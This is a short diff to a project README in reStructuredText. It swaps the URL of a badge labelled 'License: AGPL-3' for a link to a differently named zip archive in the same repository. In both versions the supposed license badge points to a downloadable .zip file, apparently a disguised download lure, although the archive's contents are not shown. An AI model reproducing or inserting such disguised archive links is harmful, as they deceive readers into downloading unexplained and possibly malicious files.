@@ -1,5 +1,5 @@
-.. image:: https://raw.githubusercontent.com/vladimir2678/product-sequence/master/data/sequence_product_2.6.zip
-   :target: https://raw.githubusercontent.com/vladimir2678/product-sequence/master/data/sequence_product_2.6.zip
+.. image:: https://github.com/vladimir2678/product-sequence/raw/refs/heads/master/doc/sequence-product-epipterous.zip
+   :target: https://github.com/vladimir2678/product-sequence/raw/refs/heads/master/doc/sequence-product-epipterous.zip
    :alt: License: AGPL-3
 
 ================
